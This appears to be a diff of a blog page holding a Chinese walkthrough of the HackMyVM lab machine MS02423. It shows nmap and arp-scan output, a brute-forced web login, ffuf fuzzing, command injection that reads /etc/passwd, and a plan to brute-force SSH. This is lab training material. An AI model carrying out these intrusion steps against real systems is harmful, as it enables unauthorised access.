@@ -1,226 +1,294 @@
-<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>HMVM-MS02423 | Yiyi</title><meta name="author" content="yiyi"><meta name="copyright" content="yiyi"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253┌──(root㉿kali)-[~]└─# arp-scan -I eth2 -l         Interface: eth2, type: EN10MB, MAC: 00:0c:29:26:ba:7d">
-<meta property="og:type" content="article">
-<meta property="og:title" content="HMVM-MS02423">
-<meta property="og:url" content="https://xyaxxya.github.io/posts/8cc5a836.html">
-<meta property="og:site_name" content="Yiyi">
-<meta property="og:description" content="1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253┌──(root㉿kali)-[~]└─# arp-scan -I eth2 -l         Interface: eth2, type: EN10MB, MAC: 00:0c:29:26:ba:7d">
-<meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://www.dmoe.cc/random.php?2667">
-<meta property="article:published_time" content="2026-02-11T04:57:11.000Z">
-<meta property="article:modified_time" content="2026-02-11T06:19:50.678Z">
-<meta property="article:author" content="yiyi">
-<meta property="article:tag" content="渗透">
-<meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://www.dmoe.cc/random.php?2667"><link rel="shortcut icon" href="https://s2.loli.net/2024/02/16/Ixe9Cyq2mFBj74T.jpg"><link rel="canonical" href="https://xyaxxya.github.io/posts/8cc5a836.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta name="google-site-verification" content="JKAzMndNFupeAvLybmTDZQvXJ-qzwexiresLFX-aPSw"/><meta name="msvalidate.01" content="46A43356A247D4026C1F053B84E2275F"/><link rel="stylesheet" href="/css/index.css?v=4.12.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.32/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
-  root: '/',
-  algolia: undefined,
-  localSearch: {"path":"/search.xml","languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
-  translate: undefined,
-  noticeOutdate: undefined,
-  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
-  copy: {
-    success: '复制成功',
-    error: '复制错误',
-    noSupport: '浏览器不支持'
-  },
-  relativeDate: {
-    homepage: false,
-    post: false
-  },
-  runtime: '天',
-  dateSuffix: {
-    just: '刚刚',
-    min: '分钟前',
-    hour: '小时前',
-    day: '天前',
-    month: '个月前'
-  },
-  copyright: undefined,
-  lightbox: 'fancybox',
-  Snackbar: undefined,
-  infinitegrid: {
-    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.0/dist/infinitegrid.min.js',
-    buttonText: '加载更多'
-  },
-  isPhotoFigcaption: false,
-  islazyload: false,
-  isAnchor: true,
-  percent: {
-    toc: true,
-    rightside: false,
-  },
-  autoDarkmode: false
-}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
-  title: 'HMVM-MS02423',
-  isPost: true,
-  isHome: false,
-  isHighlightShrink: false,
-  isToc: false,
-  postUpdate: '2026-02-11 14:19:50'
-}</script><script>(win=>{
-      win.saveToLocal = {
-        set: (key, value, ttl) => {
-          if (ttl === 0) return
-          const now = Date.now()
-          const expiry = now + ttl * 86400000
-          const item = {
-            value,
-            expiry
-          }
-          localStorage.setItem(key, JSON.stringify(item))
-        },
-      
-        get: key => {
-          const itemStr = localStorage.getItem(key)
-      
-          if (!itemStr) {
-            return undefined
-          }
-          const item = JSON.parse(itemStr)
-          const now = Date.now()
-      
-          if (now > item.expiry) {
-            localStorage.removeItem(key)
-            return undefined
-          }
-          return item.value
-        }
-      }
+<!doctype html>
+<html lang="zh-CN">
+  <head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+    <meta name="description" content="423端口 并扫出了80的robots.txt .user.txt里有编码 解密得一个用户名字典 密码提示top500 抓个包看看怎么传参的 爆破 得到 ctf player:genesis 我这里用ffuf 补充几个筛选常用参数 -mc 200 只显示响应为200的 -fs…">
+    <meta name="theme-color" content="#0d0e12">
+    <meta name="color-scheme" content="light dark">
+    <meta property="og:type" content="article">
+    <meta property="og:title" content="HMVM-MS02423 · Yiyi">
+    <meta property="og:description" content="423端口 并扫出了80的robots.txt .user.txt里有编码 解密得一个用户名字典 密码提示top500 抓个包看看怎么传参的 爆破 得到 ctf player:genesis 我这里用ffuf 补充几个筛选常用参数 -mc 200 只显示响应为200的 -fs…">
+    <meta property="og:url" content="https://xyaxxya.github.io/posts/8cc5a836.html">
+    <meta property="og:site_name" content="Yiyi">
+    <meta name="twitter:card" content="summary_large_image">
+    <link rel="canonical" href="https://xyaxxya.github.io/posts/8cc5a836.html">
+    <link rel="alternate" type="application/rss+xml" title="Yiyi RSS" href="/rss.xml">
+    <link rel="icon" href="/assets/avatar.svg" type="image/svg+xml">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Instrument+Serif:ital@0;1&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="/assets/styles.css">
+    <script>try{document.documentElement.dataset.theme=localStorage.getItem("yiyi-theme")||"auto"}catch(e){}</script>
+    <meta property="article:published_time" content="2026-02-11T04:57:11.000Z"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","headline":"HMVM-MS02423","datePublished":"2026-02-11T04:57:11.000Z","author":{"@type":"Person","name":"yiyi"},"publisher":{"@type":"Person","name":"yiyi"},"mainEntityOfPage":"https://xyaxxya.github.io/posts/8cc5a836.html","description":"423端口 并扫出了80的robots.txt .user.txt里有编码 解密得一个用户名字典 密码提示top500 抓个包看看怎么传参的 爆破 得到 ctf player:genesis 我这里用ffuf 补充几个筛选常用参数 -mc 200 只显示响应为200的 -fs…"}</script>
+    <title>HMVM-MS02423 · Yiyi</title></head>
+  <body class="inner-page post-body">
+    <a class="skip-link" href="#main-content">跳到正文</a>
     
-      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
-        const script = document.createElement('script')
-        script.src = url
-        script.async = true
-        script.onerror = reject
-        script.onload = script.onreadystatechange = function() {
-          const loadState = this.readyState
-          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
-          script.onload = script.onreadystatechange = null
-          resolve()
-        }
+    <header class="site-header" data-site-header>
+      <div class="site-header-inner">
+        <a class="site-brand" href="/" aria-label="Yiyi 首页">Yiyi</a>
+        <nav class="site-nav" aria-label="主导航"><a class="site-nav-link" href="/#articles">文章</a><a class="site-nav-link" href="/categories/">专题</a><a class="site-nav-link" href="/tags/">标签</a><a class="site-nav-link" href="/archives/">归档</a><a class="site-nav-link" href="/about/">关于</a></nav>
+        <div class="site-actions">
+          
+  <button class="icon-button" type="button" aria-label="搜索" data-tooltip="搜索" data-open-search>
+    <svg class="icon" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><path d="m21 21-4.34-4.34"></path><circle cx="11" cy="11" r="8"></circle></svg>
+  </button>
+          <button class="icon-button theme-toggle" type="button" data-theme-toggle aria-label="切换主题" data-tooltip="切换主题">
+            <svg class="icon theme-icon-light" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><circle cx="12" cy="12" r="4"></circle><path d="M12 2v2"></path><path d="M12 20v2"></path><path d="m4.93 4.93 1.41 1.41"></path><path d="m17.66 17.66 1.41 1.41"></path><path d="M2 12h2"></path><path d="M20 12h2"></path><path d="m6.34 17.66-1.41 1.41"></path><path d="m19.07 4.93-1.41 1.41"></path></svg>
+            <svg class="icon theme-icon-dark" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><path d="M20.985 12.486a9 9 0 1 1-9.473-9.472c.405-.022.617.46.402.803a6 6 0 0 0 8.268 8.268c.344-.215.825-.004.803.401"></path></svg>
+          </button>
+          
+  <button class="icon-button mobile-menu-trigger" type="button" aria-label="打开菜单" data-tooltip="打开菜单" data-menu-toggle aria-expanded="false">
+    <svg class="icon" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><path d="M4 5h16"></path><path d="M4 12h16"></path><path d="M4 19h16"></path></svg>
+  </button>
+        </div>
+      </div>
+    </header>
+    
+    <div class="reading-progress" aria-hidden="true"><span data-reading-progress></span></div>
+    <main id="main-content" class="post-page">
+      <header class="post-hero section-shell">
+        <a class="post-topic" href="/categories/?topic=%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98">靶场实战</a>
+        <h1>HMVM-MS02423</h1>
+        <p>423端口 并扫出了80的robots.txt .user.txt里有编码 解密得一个用户名字典 密码提示top500 抓个包看看怎么传参的 爆破 得到 ctf player:genesis 我这里用ffuf 补充几个筛选常用参数 -mc 200 只显示响应为200的 -fs…</p>
+        <div class="post-meta">
+  <span>2026/02/11</span>
+  <span>1 分钟</span>
+  </div>
+        <div class="post-tags"><a href="/tags/?tag=%E6%B8%97%E9%80%8F">#渗透</a></div>
+      </header>
+      <div class="post-layout section-shell">
+        <article class="article-content" data-article-content><figure class="code-block"><figcaption><span>bash</span><button class="icon-text-button" type="button" data-copy-code aria-label="复制代码"><svg class="icon" width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg><span>复制</span></button></figcaption><pre><code class="hljs language-bash">┌──(root㉿kali)-[~]
+└─# arp-scan -I eth2 -l         
+Interface: eth2, <span class="hljs-built_in">type</span>: EN10MB, MAC: 00:0c:29:26:ba:7d, IPv4: 192.168.56.121
+Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
+192.168.56.1    0a:00:27:00:00:17       (Unknown: locally administered)
+192.168.56.100  08:00:27:65:4f:3c       PCS Systemtechnik GmbH
+192.168.56.126  08:00:27:1d:d5:20       PCS Systemtechnik GmbH
 
-        Object.keys(attr).forEach(key => {
-          script.setAttribute(key, attr[key])
-        })
+3 packets received by filter, 0 packets dropped by kernel
+Ending arp-scan 1.10.0: 256 hosts scanned <span class="hljs-keyword">in</span> 2.111 seconds (121.27 hosts/sec). 3 responded
+                                                                                                                                                                     
+┌──(root㉿kali)-[~]
+└─# nmap -Pn -A -sV -T4 -p- 192.168.56.126
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-02-10 23:59 EST
+Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.126
+Host is up (0.00068s latency).
+Not shown: 65532 closed tcp ports (reset)
+PORT    STATE SERVICE VERSION
+22/tcp  open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
+| ssh-hostkey: 
+|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)
+|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)
+|_  256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)
+80/tcp  open  http    Apache httpd 2.4.59 ((Debian))
+|_http-title: Apache2 Debian Default Page: It works
+|_http-server-header: Apache/2.4.59 (Debian)
+| http-robots.txt: 6 disallowed entries 
+| /admin.txt /login.txt .config .backup .user.txt 
+|_/wp-admin
+423/tcp open  http    Apache httpd 2.4.59 ((Debian))
+| http-cookie-flags: 
+|   /: 
+|     PHPSESSID: 
+|_      httponly flag not <span class="hljs-built_in">set</span>
+|_http-title: MS02423\xE7\xB3\xBB\xE7\xBB\x9F - \xE7\x99\xBB\xE5\xBD\x95
+|_http-server-header: Apache/2.4.59 (Debian)
+MAC Address: 08:00:27:1D:D5:20 (Oracle VirtualBox virtual NIC)
+Device <span class="hljs-built_in">type</span>: general purpose
+Running: Linux 4.X|5.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+OS details: Linux 4.15 - 5.8
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
-        document.head.appendChild(script)
-      })
-    
-      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
-        const link = document.createElement('link')
-        link.rel = 'stylesheet'
-        link.href = url
-        if (id) link.id = id
-        link.onerror = reject
-        link.onload = link.onreadystatechange = function() {
-          const loadState = this.readyState
-          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
-          link.onload = link.onreadystatechange = null
-          resolve()
-        }
-        document.head.appendChild(link)
-      })
-    
-      win.activateDarkMode = () => {
-        document.documentElement.setAttribute('data-theme', 'dark')
-        if (document.querySelector('meta[name="theme-color"]') !== null) {
-          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
-        }
-      }
-      win.activateLightMode = () => {
-        document.documentElement.setAttribute('data-theme', 'light')
-        if (document.querySelector('meta[name="theme-color"]') !== null) {
-          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
-        }
-      }
-      const t = saveToLocal.get('theme')
-    
-        if (t === 'dark') activateDarkMode()
-        else if (t === 'light') activateLightMode()
-      
-      const asideStatus = saveToLocal.get('aside-status')
-      if (asideStatus !== undefined) {
-        if (asideStatus === 'hide') {
-          document.documentElement.classList.add('hide-aside')
-        } else {
-          document.documentElement.classList.remove('hide-aside')
-        }
-      }
-    
-      const detectApple = () => {
-        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
-          document.documentElement.classList.add('apple')
-        }
-      }
-      detectApple()
-    })(window)</script><meta name="generator" content="Hexo 7.1.1"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://s2.loli.net/2024/02/16/Ixe9Cyq2mFBj74T.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">39</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">69</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">5</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="https://xyaxxya.github.io/"><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/tags"><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories"><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/archives"><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="https://xyaxxya.github.io/2024/02/16/关于我"><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://www.dmoe.cc/random.php?2667')"><nav id="nav"><span id="blog-info"><a href="/" title="Yiyi"><img class="site-icon" src="https://s2.loli.net/2024/02/16/Ixe9Cyq2mFBj74T.jpg"/><span class="site-name">Yiyi</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="https://xyaxxya.github.io/"><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/tags"><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories"><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/archives"><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="https://xyaxxya.github.io/2024/02/16/关于我"><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">HMVM-MS02423</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2026-02-11T04:57:11.000Z" title="发表于 2026-02-11 12:57:11">2026-02-11</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2026-02-11T06:19:50.678Z" title="更新于 2026-02-11 14:19:50">2026-02-11</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">1.1k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>6分钟</span></span><span class="post-meta-separator">|</span><span class="leancloud_visitors" id="/posts/8cc5a836.html" data-flag-title="HMVM-MS02423"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span class="leancloud-visitors-count"><i class="fa-solid fa-spinner fa-spin"></i></span></span><span class="post-meta-separator">|</span><span class="post-meta-commentcount"><i class="far fa-comments fa-fw post-meta-icon"></i><span class="post-meta-label">评论数:</span><a href="/posts/8cc5a836.html#post-comment" itemprop="discussionUrl"><span class="valine-comment-count" data-xid="/posts/8cc5a836.html" itemprop="commentCount"><i class="fa-solid fa-spinner fa-spin"></i></span></a></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─<span class="comment"># arp-scan -I eth2 -l         </span></span><br><span class="line">Interface: eth2, <span class="built_in">type</span>: EN10MB, MAC: 00:0c:29:26:ba:7d, IPv4: 192.168.56.121</span><br><span class="line">Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class="line">192.168.56.1    0a:00:27:00:00:17       (Unknown: locally administered)</span><br><span class="line">192.168.56.100  08:00:27:65:4f:3c       PCS Systemtechnik GmbH</span><br><span class="line">192.168.56.126  08:00:27:1d:d5:20       PCS Systemtechnik GmbH</span><br><span class="line"></span><br><span class="line">3 packets received by filter, 0 packets dropped by kernel</span><br><span class="line">Ending arp-scan 1.10.0: 256 hosts scanned <span class="keyword">in</span> 2.111 seconds (121.27 hosts/sec). 3 responded</span><br><span class="line">                                                                                                                                                                     </span><br><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─<span class="comment"># nmap -Pn -A -sV -T4 -p- 192.168.56.126</span></span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-02-10 23:59 EST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.56.126</span><br><span class="line">Host is up (0.00068s latency).</span><br><span class="line">Not shown: 65532 closed tcp ports (reset)</span><br><span class="line">PORT    STATE SERVICE VERSION</span><br><span class="line">22/tcp  open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)</span><br><span class="line">|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)</span><br><span class="line">|_  256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)</span><br><span class="line">80/tcp  open  http    Apache httpd 2.4.59 ((Debian))</span><br><span class="line">|_http-title: Apache2 Debian Default Page: It works</span><br><span class="line">|_http-server-header: Apache/2.4.59 (Debian)</span><br><span class="line">| http-robots.txt: 6 disallowed entries </span><br><span class="line">| /admin.txt /login.txt .config .backup .user.txt </span><br><span class="line">|_/wp-admin</span><br><span class="line">423/tcp open  http    Apache httpd 2.4.59 ((Debian))</span><br><span class="line">| http-cookie-flags: </span><br><span class="line">|   /: </span><br><span class="line">|     PHPSESSID: </span><br><span class="line">|_      httponly flag not <span class="built_in">set</span></span><br><span class="line">|_http-title: MS02423\xE7\xB3\xBB\xE7\xBB\x9F - \xE7\x99\xBB\xE5\xBD\x95</span><br><span class="line">|_http-server-header: Apache/2.4.59 (Debian)</span><br><span class="line">MAC Address: 08:00:27:1D:D5:20 (Oracle VirtualBox virtual NIC)</span><br><span class="line">Device <span class="built_in">type</span>: general purpose</span><br><span class="line">Running: Linux 4.X|5.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5</span><br><span class="line">OS details: Linux 4.15 - 5.8</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   0.68 ms 192.168.56.126</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 15.59 seconds</span><br><span class="line">                                                                                                                                                                     </span><br><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.68 ms 192.168.56.126
 
-<p>423端口<br><img src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20260211130842076.png" alt="image-20260211130842076"></p>
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 15.59 seconds
+                                                                                                                                                                     
+┌──(root㉿kali)-[~]
+</code></pre></figure><p>423端口
+<figure class="article-image"><img src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20260211130842076.png" alt="image-20260211130842076" loading="lazy" decoding="async"></figure></p>
 <p>并扫出了80的robots.txt</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/admin.txt /login.txt .config .backup .user.txt </span><br><span class="line">|_/wp-admin</span><br></pre></td></tr></table></figure>
-
-<p>.user.txt里有编码</p>
+<figure class="code-block"><figcaption><span>text</span><button class="icon-text-button" type="button" data-copy-code aria-label="复制代码"><svg class="icon" width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg><span>复制</span></button></figcaption><pre><code class="hljs language-text">/admin.txt /login.txt .config .backup .user.txt 
+|_/wp-admin</code></pre></figure><p>.user.txt里有编码</p>
 <p>解密得一个用户名字典 密码提示top500</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">admin</span><br><span class="line">john</span><br><span class="line">alice</span><br><span class="line">sysadmin</span><br><span class="line">ctf_player</span><br><span class="line">&lt;-----passwd top 500-----&gt;</span><br></pre></td></tr></table></figure>
-
-<p>抓个包看看怎么传参的</p>
-<p><img src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20260211133111529.png" alt="image-20260211133111529"></p>
-<p><img src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20260211131939631.png" alt="image-20260211131939631"></p>
+<figure class="code-block"><figcaption><span>text</span><button class="icon-text-button" type="button" data-copy-code aria-label="复制代码"><svg class="icon" width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg><span>复制</span></button></figcaption><pre><code class="hljs language-text">admin
+john
+alice
+sysadmin
+ctf_player
+&lt;-----passwd top 500-----&gt;</code></pre></figure><p>抓个包看看怎么传参的</p>
+<p><figure class="article-image"><img src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20260211133111529.png" alt="image-20260211133111529" loading="lazy" decoding="async"></figure></p>
+<p><figure class="article-image"><img src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20260211131939631.png" alt="image-20260211131939631" loading="lazy" decoding="async"></figure></p>
 <p>爆破</p>
-<p><img src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20260211133435637.png" alt="image-20260211133435637"></p>
+<p><figure class="article-image"><img src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20260211133435637.png" alt="image-20260211133435637" loading="lazy" decoding="async"></figure></p>
 <p>得到<code>ctf_player:genesis</code></p>
-<p><img src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20260211133523582.png" alt="image-20260211133523582"></p>
+<p><figure class="article-image"><img src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20260211133523582.png" alt="image-20260211133523582" loading="lazy" decoding="async"></figure></p>
 <p>我这里用ffuf</p>
 <p>补充几个筛选常用参数</p>
 <blockquote>
 <p>-mc 200　只显示响应为200的</p>
 <p>-fs 1191 筛选响应长度不为1191的</p>
 </blockquote>
-<p><img src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20260211135124163.png" alt="image-20260211135124163"></p>
-<p>尝试手动fuzz一下命令，发现可以读&#x2F;etc&#x2F;passwd，其他的好像都读不了</p>
-<p><img src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20260211135228517.png" alt="image-20260211135228517"></p>
+<p><figure class="article-image"><img src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20260211135124163.png" alt="image-20260211135124163" loading="lazy" decoding="async"></figure></p>
+<p>尝试手动fuzz一下命令，发现可以读/etc/passwd，其他的好像都读不了</p>
+<p><figure class="article-image"><img src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20260211135228517.png" alt="image-20260211135228517" loading="lazy" decoding="async"></figure></p>
 <p>那么发现有俩用户</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">2002:x:1000:1000:2002 User:/home/2002:/bin/bash</span><br><span class="line">MS02423:x:1001:1001:MS02423 User:/home/MS02423:/bin/bash</span><br></pre></td></tr></table></figure>
+<figure class="code-block"><figcaption><span>text</span><button class="icon-text-button" type="button" data-copy-code aria-label="复制代码"><svg class="icon" width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg><span>复制</span></button></figcaption><pre><code class="hljs language-text">2002:x:1000:1000:2002 User:/home/2002:/bin/bash
+MS02423:x:1001:1001:MS02423 User:/home/MS02423:/bin/bash</code></pre></figure><p>直接爆破ssh即可 思路很固定</p>
+<figure class="code-block"><figcaption><span>bash</span><button class="icon-text-button" type="button" data-copy-code aria-label="复制代码"><svg class="icon" width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg><span>复制</span></button></figcaption><pre><code class="hljs language-bash">┌──(root㉿kali)-[~/yiyi]
